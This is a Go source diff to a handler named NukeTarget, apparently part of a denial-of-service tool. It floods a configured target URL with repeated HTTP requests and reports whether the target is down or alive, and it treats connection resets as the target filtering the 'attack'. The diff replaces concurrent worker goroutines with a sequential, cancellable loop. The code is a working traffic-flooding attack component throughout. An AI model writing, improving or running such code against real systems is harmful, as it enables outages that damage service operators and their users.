@@ -8,7 +8,6 @@ import (
 	"log"
 	"net/http"
 	"os"
-	"sync"
 	"syscall"
 
 	logw "github.com/andriiyaremenko/logwriter"
@@ -17,7 +16,7 @@ import (
 	"github.com/pkg/errors"
 )
 
-func NukeTarget(client http.Client, amountSylos int, amountRequests int64) command.Handler {
+func NukeTarget(client http.Client, amountRequests int64) command.Handler {
 	return &command.BaseHandler{
 		Type: "NUKE_TARGET",
 		HandleFunc: func(ctx context.Context, w command.EventWriter, e command.Event) {
@@ -36,88 +35,91 @@ func NukeTarget(client http.Client, amountSylos int, amountRequests int64) comma
 				return
 			}
 
-			var wg sync.WaitGroup
-			for i := amountSylos; i > 0; i-- {
-				wg.Add(1)
-				go func() {
-					defer wg.Done()
-					for i := amountRequests; i > 0; i-- {
-						req, err := http.NewRequest(target.Method, target.URL, bytes.NewReader(target.Data))
-						if err != nil {
-							log.Println(logw.Error, err)
-							return
-						}
+			for i := amountRequests; i > 0; i-- {
+				select {
+				case <-ctx.Done():
+					return
+				default:
+				}
 
-						for _, header := range target.Headers {
-							req.Header.Add(header[0], header[1])
-						}
+				var body io.Reader = nil
 
-						resp, err := client.Do(req)
+				if target.Data != nil {
+					body = bytes.NewReader(target.Data)
+				}
 
-						if errors.Is(err, context.DeadlineExceeded) || os.IsTimeout(err) {
-							w.Write(command.E{
-								Type: "TARGET_DOWN",
-								P:    p,
-							})
-							return
-						}
+				req, err := http.NewRequest(target.Method, target.URL, body)
+				if err != nil {
+					log.Println(logw.Error, err)
+					return
+				}
 
-						if errors.Is(err, io.EOF) || errors.Is(err, syscall.ECONNRESET) {
-							w.Write(
-								command.NewErrEvent(
-									e,
-									errors.Wrap(err, "attac failed, target filters traffic"),
-								),
-							)
-							return
-						}
+				for _, header := range target.Headers {
+					req.Header.Add(header[0], header[1])
+				}
 
-						if err != nil {
-							w.Write(command.NewErrEvent(e, errors.Wrap(err, "request failed")))
-							return
-						}
+				resp, err := client.Do(req)
 
-						resp.Body.Close()
+				if errors.Is(err, context.DeadlineExceeded) || os.IsTimeout(err) {
+					w.Write(command.E{
+						Type: "TARGET_DOWN",
+						P:    p,
+					})
+					return
+				}
 
-						if resp.StatusCode == http.StatusServiceUnavailable ||
-							resp.StatusCode == http.StatusGatewayTimeout {
-							w.Write(command.E{
-								Type: "TARGET_DOWN",
-								P:    p,
-							})
+				if errors.Is(err, io.EOF) || errors.Is(err, syscall.ECONNRESET) {
+					w.Write(
+						command.NewErrEvent(
+							e,
+							errors.Wrap(err, "attac failed, target filters traffic"),
+						),
+					)
+					return
+				}
 
-							return
-						}
+				if err != nil {
+					w.Write(command.NewErrEvent(e, errors.Wrap(err, "request failed")))
+					return
+				}
 
-						if resp.StatusCode < 300 {
-							w.Write(command.E{
-								Type: "TARGET_ALIVE",
-								P:    p,
-							})
+				resp.Body.Close()
 
-							return
-						}
+				if resp.StatusCode == http.StatusServiceUnavailable ||
+					resp.StatusCode == http.StatusGatewayTimeout {
+					w.Write(command.E{
+						Type: "TARGET_DOWN",
+						P:    p,
+					})
 
-						targetErr := dto.TargetError{
-							Target:  *target,
-							ErrCode: resp.StatusCode,
-						}
+					return
+				}
 
-						b, err := json.Marshal(targetErr)
-						if err != nil {
-							w.Write(command.NewErrEvent(e, errors.Wrap(err, "bad target error record")))
-							return
-						}
+				if resp.StatusCode < 300 {
+					w.Write(command.E{
+						Type: "TARGET_ALIVE",
+						P:    p,
+					})
 
-						w.Write(command.E{
-							Type: "TARGET_ERROR",
-							P:    b,
-						})
-					}
-				}()
+					return
+				}
+
+				targetErr := dto.TargetError{
+					Target:  *target,
+					ErrCode: resp.StatusCode,
+				}
+
+				b, err := json.Marshal(targetErr)
+				if err != nil {
+					w.Write(command.NewErrEvent(e, errors.Wrap(err, "bad target error record")))
+					return
+				}
+
+				w.Write(command.E{
+					Type: "TARGET_ERROR",
+					P:    b,
+				})
 			}
-
-			wg.Wait()
 		},
 	}
 }
